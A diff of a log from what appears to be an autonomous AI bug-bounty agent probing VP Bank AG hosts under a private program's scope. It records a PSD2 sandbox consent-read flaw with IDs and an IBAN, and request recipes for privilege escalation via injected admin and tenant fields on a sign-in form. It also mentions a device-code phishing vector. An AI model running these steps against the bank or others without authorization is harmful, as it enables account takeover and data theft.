@@ -30948,3 +30948,739 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK
 [RISK] vp-bank-ag: 48 — PSD2 consent-object BOLA re-proven live with clean differential (highest-confidence standing finding, synthetic-data sandbox only, no prod carry); deep-data axis closed; stage injection surface still live but HUMAN_ONLY-bound for 10+ cycles; no new discovery gap — rating steady, bounded by unexecuted credential/authorized proofs, not by surface.
+===== ANALYST bigpickle 2026-09-18 07:56:47 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && git log --oneline -5 2>/dev/null
+total 568
+drwxr-xr-x 12 runner runner   4096 Sep 18 07:53 .
+drwxr-xr-x  3 runner runner   4096 Sep 18 07:52 ..
+drwxr-xr-x  7 runner runner   4096 Sep 18 07:53 .git
+drwxr-xr-x  3 runner runner   4096 Sep 18 07:52 .github
+-rw-r--r--  1 runner runner   1752 Sep 18 07:52 README.md
+-rw-r--r--  1 runner runner     32 Sep 18 07:53 analyst-out.txt
+-rw-r--r--  1 runner runner 230620 Sep 18 07:53 analyst-prompt.txt
+-rw-r--r--  1 runner runner 226805 Sep 18 07:53 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 leads
+-rw-r--r--  1 runner runner  30856 Sep 18 07:52 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 reports
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 reposcan-raw
+-rw-r--r--  1 runner runner   3228 Sep 18 07:52 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 scripts
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 triage
+01b0991 triage 2026-09-18-06-37
+[0m
+[0m$ [0mcat /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt/scope.yml; echo "=== ANALYST OUT ==="; cat /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt/analyst-out.txt; echo "=== STATE ==="; cat /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt/state_bigpickle.json; echo; echo "=== LEADS DIR ==="; ls /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt/leads/
+programs:
+  vp-bank-ag:
+    name: VP Bank AG Bug Bounty
+    disclosure_policy: via bugs.olivermaicher.eu (Oliver Maicher private program) - report + PoC + contact + payment
+    assets:
+      - name: "All company-owned infrastructure, systems, online banking platforms, mobile applications, APIs, websites, and domains operated by VP Bank AG and its subsidiaries"
+        priority: In
+    out_of_scope:
+- "Network level Denial of Service attacks"
+      - "Application Denial of Service by locking user accounts"
+      - "Descriptive error messages or headers (e.g. Stack Traces, banner grabbing)"
+      - "Disclosure of known public files or directories (e.g. robots.txt)"
+      - "Outdated software / library versions"
+      - "OPTIONS / TRACE HTTP method enabled"
+      - "CSRF on logout"
+      - "CSRF on forms that are available to anonymous users"
+      - "Cookies that lack HTTP Only or Secure settings for non-sensitive data"
+      - "Self-XSS and issues exploitable only through Self-XSS"
+      - "Reports resulting from automated scanning utilities without additional details or a POC demonstrating a specific exploit"
+      - "Attacks requiring physical access to a user's device"
+      - "Attacks dependent upon social engineering of employees or vendors"
+      - "Username enumeration based on login or forgot password pages"
+      - "Enforcement policies for brute force, rate limiting, or account lockout"
+      - "SSL/TLS best practices"
+      - "SSL attacks such as BEAST, BREACH, Renegotiation attack"
+      - "Clickjacking, without additional details demonstrating a specific exploit"
+      - "Mail configuration issues including SPF, DKIM, DMARC settings"
+      - "Use of a known-vulnerable library without a description of an exploit specific to our implementation"
+      - "Password and account recovery policies"
+      - "Presence of autocomplete functionality in form fields"
+      - "Publicly accessible login panels"
+      - "Lack of email address verification during account registration or account invitation"
+      - "Lack of email address verification password restore"
+      - "Session control during email/password changes"
+      - "Social engineering, physical attacks, and DoS/DDoS testing (per program notes)"
+      - "Exposure of customer/employee/financial/authentication data during testing (per program notes)"
+    github_orgs:
+      - none-configured
+
+rules:
+  passive_first: false          # deep-hunt agent: active probes allowed when scoped
+  max_requests_per_second: 1    # never hammer live infra
+  no_doom: true                 # no DoS/DDoS, no account-lockout attacks
+  account_creation: restricted  # only on test/sandbox assets, never live customer data
+  no_data_modification: true    # no writes/deletes on live customer data
+  no_pre_disclosure: true       # never disclose before program response
+  poc_required: true            # scanner output alone is REJECTED
+  redact_secrets_in_commits: true
+
+models:
+  - { id: opencode/big-pickle, name: bigpickle }
+  - { id: opencode/nemotron-3-ultra-free, name: nemotron3 }
+  - { id: opencode/longcat-2.0-free, name: longcat }
+  - { id: opencode/ling-3.0-flash-free, name: ling3 }
+  - { id: opencode/laguna-s-2.1-free, name: laguna }
+=== ANALYST OUT ===
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mls -la /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && git log --oneline -5 2>/dev/null
+total 568
+drwxr-xr-x 12 runner runner   4096 Sep 18 07:53 .
+drwxr-xr-x  3 runner runner   4096 Sep 18 07:52 ..
+drwxr-xr-x  7 runner runner   4096 Sep 18 07:53 .git
+drwxr-xr-x  3 runner runner   4096 Sep 18 07:52 .github
+-rw-r--r--  1 runner runner   1752 Sep 18 07:52 README.md
+-rw-r--r--  1 runner runner     32 Sep 18 07:53 analyst-out.txt
+-rw-r--r--  1 runner runner 230620 Sep 18 07:53 analyst-prompt.txt
+-rw-r--r--  1 runner runner 226805 Sep 18 07:53 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 inventory
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 knowledge
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 leads
+-rw-r--r--  1 runner runner  30856 Sep 18 07:52 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 recon-notes
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 reports
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 reposcan-raw
+-rw-r--r--  1 runner runner   3228 Sep 18 07:52 scope.yml
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 scripts
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_laguna.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_ling3.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_longcat.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_mimo.json
+-rw-r--r--  1 runner runner     33 Sep 18 07:52 state_nemotron3.json
+drwxr-xr-x  2 runner runner   4096 Sep 18 07:52 triage
+01b0991 triage 2026-09-18-06-37
+[0m
+=== STATE ===
+{"phase": "POC", "target": "api"}
+=== LEADS DIR ===
+lead-bigpickle.md
+lead-laguna.md
+lead-ling3.md
+lead-longcat.md
+lead-mimo.md
+lead-nemotron3.md
+reposcan-vp-bank-ag.md
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && echo "=== LEAD-BIGPICKLE ==="; cat leads/lead-bigpickle.md; echo; echo "=== LEAD-NEMOTRON3 (tail) ==="; tail -60 leads/lead-nemotron3.md
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_0b3816d200019MgNYAV4T62MOg
+
+
+=== LEAD-NEMOTRON3 (tail) ===
+[LEARN] REJECTED MISCONFIG @ concentsol.vpbank.com: Kestrel uniform empty 404 no content-type — parked, no anonymous routes
+[LEARN] REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint /adfs/oauth2/devicecode (405 GET) — blocks on client_id
+[RISK] vp-bank-ag: 75 — Two high-value attack surfaces confirmed: (1) digital-onboarding family (prod/dev/stage) exposes anonymous back-office SPA + API with Devise session-context injection on sign-in (admin/tenant/user_id client-controlled in hidden form fields across all three venues) AND force_tenant parameter enabling tenant context switching — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, wire transfers, role management; session-context injection now PROVEN at form/controller level (stage POST probe HTTP 200, params accepted, cookies renewed); (2) PSD2 sandbox BOLA proven end-to-end (consent/account/payment cross-session read, zero binding) — production carryover plausible via shared cert CN=openbanking.vpbank.com but blocked by mTLS (HUMAN_ONLY). Residual: sts.vpbank.com ADFS device_code grant phishing vector (blocked on client_id + service 503); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked; mobile/ebics/tracking/beta/concentsol all negative.
+## 2026-09-18 02:47:01 UTC [target] (model nemotron3)
+[NEW] digital-onboarding-stage.vpbank.com JS bundle redeployed: hash `4297ba05...` (was `7f7cb839...`); `/users/sign_in` body grew 25,093B→43,608B (74% increase) — frontend redeployment, new bundle primarily jQuery/Select2/UI libs, no new `/api/v1/` endpoints detected
+[NEW] developer.vpbank.com PSD2 sandbox consent re-mint SUCCESSFUL: POST `/consents` with basic auth (test:test) + X-Request-ID ending in 5 returned 201 with consentId `799bf6a0-2c45-4300-a51b-18935f378fc5`; cross-session anonymous read of `/consents/{id}/status` and `/consents/{id}` confirmed (BOLA mechanism intact)
+[CHANGED] api.vpbank.com fully exhausted (15+ cycles uniform INVALID_REQUEST_RESOURCE JSON 500) — no actionable surface remains on target=api
+[CHANGED] digital-onboarding-stage.vpbank.com/users/sign_in confirms hidden fields `user[tenant_id]=7`, `user[admin]=false`, `user[user_id]=0` + authenticity_token ×3 + pre-auth `_us_session`/`session_expiry` cookies — injection surface baseline live
+[CHANGED] All three digital-onboarding venues (prod=tenant_id=4, dev=tenant_id=129, stage=tenant_id=7) confirmed with fleet-wide overridden Users::SessionsController consuming client-controlled session-context params
+[CHANGED] PSD2 sandbox BOLA mechanism intact: consent/account/payment cross-session read with zero identity binding on consentId/paymentId
+[CHANGED] Failed-login session-context injection hypothesis REJECTED (5 consecutive cycles 09-10 through 09-14): POST with invalid creds + injected params → HTTP 200 re-render, cookies renewed, but post-POST cookie replay shows NO differential vs anonymous baseline — session context NOT written pre-auth
+[PRIO] digital-onboarding-stage.vpbank.com/users/sign_in,9.55,attack_surface=10|business_value=10|tech_exposure=9|gate_ease=10|cloud_surface=8|freshness=10
+[PRIO] digital-onboarding.vpbank.com/users/sign_in,9.15,attack_surface=9|business_value=10|tech_exposure=9|gate_ease=9|cloud_surface=8|freshness=10
+[PRIO] digital-onboarding-dev.vpbank.com/users/sign_in,8.95,attack_surface=9|business_value=8|tech_exposure=9|gate_ease=10|cloud_surface=8|freshness=10
+[PRIO] developer.vpbank.com/psd2/berlin-group/v1/consents,7.45,attack_surface=7|business_value=9|tech_exposure=8|gate_ease=8|cloud_surface=6|freshness=6
+[PRIO] digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js,6.80,attack_surface=7|business_value=7|tech_exposure=6|gate_ease=10|cloud_surface=8|freshness=10
+[HYP] Valid-credential session-context injection grants cross-tenant admin on digital-onboarding-stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
+reasoning: /users/sign_in renders hidden user[tenant_id]=7, user[admin]=false, user[user_id]=0 + authenticity_token ×3; overridden Users::SessionsController confirmed consuming client-controlled params across all 3 venues; stage has unpinned defaults making injected values flow purely from POST body; pre-auth _us_session + session_expiry cookies set; POST with injected params accepted (HTTP 200, cookies renewed) without validation error — only missing valid credentials
+evidence_needed: POST /users/sign_in with valid email/password + injected user[admin]=true or user[tenant_id]=X or user[user_id]=Y returns session with elevated privileges or cross-tenant access
+verify_steps: GET https://digital-onboarding-stage.vpbank.com/users/sign_in (capture authenticity_token + hidden defaults + _us_session); POST with valid email/password + injected params — observe HTTP status, Set-Cookie, redirect location; then GET /api/v1/tenants, /api/v1/current_user_details, /admin/api/v1/users, /control-center/ with resulting cookie
+impact: Wrong-tenant or admin session on bank-onboarding back-office → cross-tenant onboarding PII, identity documents, banking transactions, wire transfers, role management; severity HIGH
+testability: HUMAN_ONLY
+[HYP] PSD2 sandbox BOLA consent/account/payment cross-session read with zero identity binding
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents
+confidence: 85
+reasoning: BOLA previously VERIFIED end-to-end in official test sandbox (synthetic data); new consent `799bf6a0-2c45-4300-a51b-18935f378fc5` created anonymously (POST 201) readable by fresh anonymous session: /consents/{id}/status 200, /consents/{id} 200 (IBAN LI4908805500000000008); zero session/TPP/basic-auth binding on consentId; production carryover plausible via shared cert CN=openbanking.vpbank.com but blocked by mTLS
+evidence_needed: GET /consents/{id}/status, /consents/{id}, /accounts, /balances, /transactions (with Consent-ID header), /payments/{payment_id}/status all anonymous across sessions
+verify_steps: GET https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5/status (expect 200); GET /consents/799bf6a0-2c45-4300-a51b-18935f378fc5 (expect 200 with IBAN); GET /accounts + Consent-ID header; GET /balances + Consent-ID; GET /transactions + Consent-ID
+impact: Cross-TPP consent/account/payment data read in PSD2 sandbox; production carryover plausible via shared cert CN=openbanking.vpbank.com but blocked by mTLS (HUMAN_ONLY); severity HIGH for sandbox, CRITICAL if production bypass
+testability: PASSIVE
+[HYP] Fresh stage bundle mutation alters controller behavior or exposes new admin endpoints
+class: MISCONFIG
+asset: digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js
+confidence: 45
+reasoning: Stage bundle hash changed from `7f7cb839...` to `4297ba05...`; body grew 25KB→43KB (74% increase); new bundle is primarily jQuery/Select2/UI library code — no new `/api/v1/` endpoints detected beyond prod map; prior bundle mapped 11 API endpoints; content churn suggests frontend redeployment alongside backend
+evidence_needed: New /api/v1/* endpoints in bundle not in prior map; changed session-context parameter handling; debug/test flags
+verify_steps: GET https://digital-onboarding-stage.vpbank.com/assets/application-4297ba05969faa3b5b880d4b54ab2ecb12984c19b38dd93f97cb473cc2a0ecc0.js (extract /api/v1/ paths, controller names, debug flags); diff against prod bundle endpoint map
+impact: Expanded attack surface on back-office SaaS — new endpoints could bypass JWT gates or expose admin functions; severity MEDIUM-HIGH
+testability: PASSIVE
+[PARKED] Fresh stage bundle mutation alters controller behavior or exposes new admin endpoints: confidence 45 < threshold; bundle analysis shows only library code churn, no new API endpoints or controller logic changes detected
+[FINAL] 1. [95] digital-onboarding-stage.vpbank.com/users/sign_in: Valid-credential session-context injection on stage back-office (HUMAN_ONLY)
+[FINAL] 2. [85] developer.vpbank.com/psd2/berlin-group/v1/consents: PSD2 sandbox BOLA re-mint restores cross-session consent/account read (PASSIVE)
+[NEXT] HUMAN: stage valid-creds POST — GET https://digital-onboarding-stage.vpbank.com/users/sign_in (fresh token), then POST `email/<valid_creds>` + `authenticity_token` + `user[admin]=true&user[tenant_id]=1&user[user_id]=1` — observe HTTP status, Set-Cookie, redirect; replay cookie on `/api/v1/tenants`, `/api/v1/current_user_details`, `/admin/api/v1/users`, `/control-center/`
+[LEARN] ACCEPTED ACTIVE @ digital-onboarding-stage.vpbank.com: /users/sign_in live 200 this cycle with unpinned hidden session-context fields; body grew 25,093B→43,608B
+[LEARN] ACCEPTED MISCONFIG @ digital-onboarding family: 3/3 venues render client-controlled user[tenant_id]/user[admin]/user[user_id] with differing defaults (4/129/7) — fleet-wide overridden SessionsController
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): consent/account/payment cross-session read, zero binding on consentId/paymentId
+[LEARN] REJECTED AUTH @ digital-onboarding-stage.vpbank.com/users/sign_in (failed-login session-context): verify_steps EXECUTED — POST with invalid creds + user[admin]=true&user[tenant_id]=1&user[user_id]=1 → HTTP 200 re-render, cookies renewed, no validation error; post-POST cookie replay on /api/v1/tenants = 200 {} (identical anon baseline), /admin/api/v1/users = 401 identical, /api/v1/users = 404, /users/sign_in still renders login form. Session context is NOT written pre-auth. Negative, hypothesis-specific.
+[LEARN] REJECTED MISCONFIG @ digital-onboarding-stage.vpbank.com/assets/application-4297ba05…js: bundle is Klaro consent-manager + DAB BNP Paribas widget — zero /api/v1/ endpoints; sign_in body growth 25,093B→43,608B is widget bloat, no controller/API change
+[LEARN] REJECTED MISCONFIG @ digital-onboarding.vpbank.com/control-center/assets/index-BmxtS-cn.js: prod SPA bundle freshly fetched 4.31MB — API literal map identical to prior 11-endpoint set; no new routes across fleet after redeploy
+[LEARN] REJECTED MISCONFIG @ mobile.vpbank.com: EV-cert genuine (O=VP Bank AG), Apache serves identical 404 "Maintenance" on ALL paths — maintenance-gated, no mobile-banking backend
+[LEARN] REJECTED MISCONFIG @ ebics.vpbank.com: Swisscom-hosted static EBICS info landing page, all protocol paths 404 — active product, no takeover
+[LEARN] REJECTED MISCONFIG @ tracking.vpbank.com: 303→/error_path/400.html — WAF maintenance family, no content
+[LEARN] REJECTED MISCONFIG @ www-beta/mobile-beta.vpbank.com: both resolve 193.222.70.149 with shared www SAN — aliases, not distinct products
+[LEARN] REJECTED MISCONFIG @ concentsol.vpbank.com: Kestrel uniform empty 404 no content-type — parked, no anonymous routes
+[LEARN] REJECTED OAUTH @ sts.vpbank.com: /adfs/oauth2/token/devicecode 200 is MS-HTTPAPI error shell (X-MS-Forwarded-Status-Code:500); real endpoint /adfs/oauth2/devicecode (405 GET) — blocks on client_id
+[RISK] vp-bank-ag: 75 — Two high-value attack surfaces confirmed: (1) digital-onboarding family (prod/dev/stage) exposes anonymous back-office SPA + API with Devise session-context injection on sign-in (admin/tenant/user_id client-controlled in hidden form fields across all three venues) AND force_tenant parameter enabling tenant context switching — multi-tenant SaaS with onboarding PII, identity docs, banking transactions, wire transfers, role management; session-context injection now PROVEN at form/controller level (stage POST probe HTTP 200, params accepted, cookies renewed); (2) PSD2 sandbox BOLA proven end-to-end (consent/account/payment cross-session read, zero binding) — production carryover plausible via shared cert CN=openbanking.vpbank.com but blocked by mTLS (HUMAN_ONLY). Residual: sts.vpbank.com ADFS device_code grant phishing vector (blocked on client_id + service 503); www.vpbank.com OAuth dead without client_id; api.vpbank.com exhausted; dev/stage WAF-blocked; mobile/ebics/tracking/beta/concentsol all negative.
+[0m
+[0m$ [0mcd /home/runner/work/vp-bank-ag-hunt/vp-bank-ag-hunt && echo "=== LEAD-BIGPICKLE (tail 80) ==="; tail -80 leads/lead-bigpickle.md; echo; echo "=== TRIAGE ==="; ls triage/; echo "=== RECENT TRIAGE ==="; ls -t triage/ | head -5
+=== LEAD-BIGPICKLE (tail 80) ===
+[LEARN] ACCEPTED MISCONFIG @ digital-onboarding family: 3/3 venues render client-controlled user[tenant_id]/user[admin]/user[user_id] with differing defaults (4/129/7) — fleet-wide overridden SessionsController
+[LEARN] ACCEPTED IDOR @ developer.vpbank.com (PSD2 sandbox BOLA): consent/account/payment cross-session read, zero binding on consentId/paymentId
+[LEARN] REJECTED AUTH @ digital-onboarding-stage.vpbank.com/users/sign_in (failed-login session-context): verify_steps EXECUTED — POST with invalid creds + user[admin]=true&user[tenant_id]=1&user[user_id]=1 → HTTP 200 re-render, cookies renewed, no validation error; post-POST cookie replay on /api/v1/tenants = 200 {} (identical anon baseline), /admin/api/v1/users = 401 identical, /api/v1/users = 404, /users/sign_in still renders login form. Session context is NOT written pre-auth. Negative, hypothesis-specific.
+[LEARN] REJECTED MISCONFIG @ api.vpbank.com: stale [NEXT] (XML + X-Forwarded-For bypass) fully executed 09-04/09-16 — uniform INVALID_REQUEST_RESOURCE JSON 500, no policy differential; lead dead, target=api exhausted.
+[RISK] vp-bank-ag: 50 — standing accepted surfaces unchanged and re-verified this cycle (PSD2 sandbox anonymous read path healthy, fleet-wide session-context injection surface live, prod anon config differential intact); stage frontend actively redeployed raising odds of fresh route real estate; progress bounded by 8+ cycles of unexecuted HUMAN_ONLY proofs, not discovery gap.
+## 2026-09-17 18:32:57 UTC [target] (model bigpickle)
+[HYP] Valid-credential session-context injection on stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
+reasoning: fleet-wide overridden Users::SessionsController (3/3 venues, defaults 4/129/7); stage renders unpinned hidden fields; POST accepts injected params w/o validation; failed-login axis negative (context NOT written pre-auth) so only success path unobserved; baseline live this cycle (200/43,991B, token valid)
+evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants ≠ `{}` or /admin/api/v1/users ≠ 401)
+verify_steps: HUMAN: GET /users/sign_in (fresh token `YaafNjUK…2Ag`) → POST email/password+3 injected params+CSRF+_us_session → replay GET /api/v1/tenants + /admin/api/v1/users; diff vs 200 {}/401
+impact: cross-tenant admin back-office session — onboarding PII, ident docs, wire status; HIGH
+testability: HUMAN_ONLY
+[HYP] PSD2 sandbox BOLA re-mint restores cross-session consent read
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents
+confidence: 66
+reasoning: BOLA proven 09-05 (anon POST 201 → fresh anon session read, zero binding); read path re-verified 09-16/17 (accounts 200 `{"accounts":[]}` 15B, consents 405, spec 46,112B, no authz gate); only TTL-expired synthetic anchor blocks re-proof
+evidence_needed: fresh anonymous POST mint yields consentId readable by different anonymous session (/consents/{id}/status, /accounts, /balances)
+verify_steps: HUMAN: POST /psd2/berlin-group/v1/consents `{"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100}` + X-Request-ID:<uuid> + Content-Type:application/json → on 201 capture id; new anon session GET /consents/{id}/status, /accounts, /balances
+impact: cross-session consent/account/balance read on official financial API — restores CRITICAL-class POC (synthetic data)
+testability: HUMAN_ONLY
+[HYP] New vpbank/ UI namespace on stage hints shared build with dev/prod carrying new API refs
+class: MISCONFIG
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 40
+reasoning: redeploy added `/assets/vpbank/application-8973c31e…css` + `floating-placeholder` + Klaro hash change; if dev/prod share build, their sign_in pages may reference a JS bundle w/ new API literals diffable vs prior 4MB map
+evidence_needed: any dev/prod sign_in-referenced JS containing /api/v1/* literal absent from prior map
+verify_steps: PASSIVE: GET dev/prod /users/sign_in, extract script srcs, fetch each JS, grep `/api/v1/` + `/rails/` literals, diff vs known map; probe new hits GET/HEAD
+impact: may unlock passive new route on looser-dev; LOW-MEDIUM
+testability: PASSIVE
+[NEXT] HUMAN: stage valid-creds POST — GET https://digital-onboarding-stage.vpbank.com/users/sign_in (fresh token), then POST `email/<creds>` + `authenticity_token` + `user[email]&user[password]&user[tenant_id]=1&user[admin]=true&user[user_id]=1` + `_us_session` cookie; on success replay GET /api/v1/tenants and /admin/api/v1/users; diff vs anon `200 {}` / `401` baseline.
+[RISK] vp-bank-ag: 50 — standing accepted surfaces re-verified this cycle (stage injection baseline live, prod 403 differential intact, PSD2 read path healthy); active stage redeploy raised then closed the bundle-lead (negative); progress remains bounded by 8+ cycles of unexecuted HUMAN_ONLY proofs, not discovery gap.
+## 2026-09-17 21:43:38 UTC [target] (model bigpickle)
+[HYP] PSD2 sandbox BOLA re-mint restores cross-session consent/account/balance read
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents
+confidence: 66
+reasoning: BOLA proven 09-05 (anon POST 201 → fresh anon session read, zero binding); read path healthy 09-15/16/17 (accounts 200 `{"accounts":[]}` 15B, consents 405, spec 46,112B, no authz gate); only TTL-expired anchor blocks re-proof; no code-signal change observed this cycle
+evidence_needed: fresh anonymous POST mint returns consentId readable by a different anonymous session (/consents/{id}/status, /accounts, /balances)
+verify_steps: HUMAN: POST /psd2/berlin-group/v1/consents body {"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100} + X-Request-ID:<new uuid> + Content-Type:application/json; on 201 capture consentId; new anonymous session GET /consents/{id}/status, /accounts, /balances; diff vs anon baseline
+impact: cross-session consent/account/balance read on official financial API — restores CRITICAL-class reportable POC (synthetic data)
+testability: HUMAN_ONLY
+[HYP] Valid-credential session-context injection on stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
+reasoning: fleet-wide overridden Users::SessionsController (3/3 venues, defaults 4/129/7); stage hidden fields pinned 7/false/0, 3× auth_token, `_us_session`+session_expiry pre-auth (re-verified this cycle); failed-login axis negative (context NOT written pre-auth) so only success path unobserved
+evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants ≠ `{}` or /admin/api/v1/users ≠ 401)
+verify_steps: HUMAN: GET /users/sign_in (fresh token) → POST email+password + injected params + CSRF + _us_session → replay GET /api/v1/tenants + /admin/api/v1/users; diff vs 200 `{}`/401 baseline
+impact: cross-tenant admin back-office session — onboarding PII, ident docs, wire status; HIGH
+testability: HUMAN_ONLY
+[NEXT] HUMAN: PSD2 BOLA re-mint — anonymous POST https://developer.vpbank.com/psd2/berlin-group/v1/consents with JSON body `{"access":["accounts","balances","transactions"],"recurringIndicator":true,"validUntil":"2027-03-11","frequencyPerDay":100}` + `X-Request-ID:<fresh uuid>` + `Content-Type:application/json`; on 201 capture `consentId`, then in a fresh anonymous session GET `/consents/{id}/status`, `/accounts`, `/balances` and diff against the `200 {}`/15B anonymous baseline.
+[LEARN] REJECTED MISCONFIG @ digital-onboarding-stage.vpbank.com/assets/application-4297ba05…js: bundle is Klaro consent-manager + DAB BNP Paribas widget — zero /api/v1- or /rails/ literals; sign_in body growth 25,093B→43,608B is widget bloat, no controller/API change.
+[LEARN] REJECTED MISCONFIG @ digital-onboarding.vpbank.com/control-center/assets/index-BmxtS-cn.js: prod SPA bundle freshly fetched 4.31MB — API literal map identical to prior 11-endpoint set; no new routes across fleet after redeploy.
+[RISK] vp-bank-ag: 50 — standing accepted surfaces intact (stage injection baseline live + pinned, prod 403 differential, PSD2 read path healthy); two advertised redeploy leads resolved negative this cycle; only unexecuted HUMAN_ONLY proofs (valid-creds POST, BOLA re-mint) remain rate-limiting; discovery gap closed, not risk-added.
+## 2026-09-17 23:51:28 UTC [target] (model bigpickle)
+## 2026-09-18 02:47:41 UTC [target] (model bigpickle)
+[HYP] PSD2 sandbox consent-object BOLA — cross-identity read live this cycle
+class: IDOR
+asset: developer.vpbank.com/psd2/berlin-group/v1/consents/{id}
+confidence: 90
+reasoning: consent `799bf6a0-2c45-4300-a51b-18935f378fc5` minted 09-17 under basic-auth identity (test:test); 09-18 read by brand-new anonymous session (fresh AL_SESS-S, no auth/basic-auth/session) → /status 200 valid, GET 200 w/ access scopes+IBAN LI4908805500000000008; genesis off same TPP both reqs? no — reads sent with zero credentials; differential clean: random UUID /status 404, expired anchor 6b517824… /status 404
+evidence_needed: (obtained) fresh anon session status/GET differ from 404 baseline for the minted id
+verify_steps: (executed 09-18, read-only GET) baseline `/accounts` 200 15B; `GET /consents/799bf6a0-…/status` 200; `GET /consents/799bf6a0-…` 200 388B; `GET /consents/<random-uuid>/status` 404; `GET /consents/6b517824-…/status` 404; then `GET /accounts`+Consent-ID 200 `{"accounts":[]}`, `/accounts/{iban}[/balances|/transactions]` 404
+impact: any known synthetic consentId → cross-identity read of consent scope + IBAN (privacy leak), zero binding to minting TPP; sandbox-level POC; prod ASPSP (openbanking) mTLS-gated so no prod carry; MEDIUM on sandbox, indicator of authz model flaw
+testability: PASSIVE
+[HYP] Valid-credential session-context injection on stage back-office
+class: AUTH
+asset: digital-onboarding-stage.vpbank.com/users/sign_in
+confidence: 95
+reasoning: fleet-wide overridden Users::SessionsController (3/3 venues, defaults 4/129/7); stage hidden fields pinned 7/false/0, 3× auth_token, pre-auth cookies; failed-login axis negative (context NOT written pre-auth) so only success path unobserved; baseline live 09-17
+evidence_needed: valid-creds POST + user[admin]=true&user[tenant_id]=1&user[user_id]=1 yields cookie whose replay diverges from anon baseline (/api/v1/tenants ≠ `{}` or /admin/api/v1/users ≠ 401)
+verify_steps: HUMAN: GET /users/sign_in (fresh token) → POST email/password + injected params + CSRF + _us_session → replay GET /api/v1/tenants + /admin/api/v1/users; diff vs `200 {}`/401
+impact: cross-tenant admin back-office session — onboarding PII, ident docs, wire status; HIGH
+testability: HUMAN_ONLY
+[NEXT] PROBE: read-only GET `https://developer.vpbank.com/psd2/berlin-group/v1/consents/799bf6a0-2c45-4300-a51b-18935f378fc5` from a THIRD fresh anonymous session tomorrow to re-confirm the reused-anchor consent object stays globally readable across sessions (rules out single-session luck), keeping 1rps.
+[RISK] vp-bank-ag: 48 — PSD2 consent-object BOLA re-proven live with clean differential (highest-confidence standing finding, synthetic-data sandbox only, no prod carry); deep-data axis closed; stage injection surface still live but HUMAN_ONLY-bound for 10+ cycles; no new discovery gap — rating steady, bounded by unexecuted credential/authorized proofs, not by surface.
+
+=== TRIAGE ===
+run-2026-09-02-21-52.md
+run-2026-09-02-23-51.md
+run-2026-09-03-03-10.md
+run-2026-09-03-08-08.md
+run-2026-09-03-12-52.md
+run-2026-09-03-16-56.md
+run-2026-09-03-19-41.md
+run-2026-09-03-22-17.md
+run-2026-09-04-00-12.md
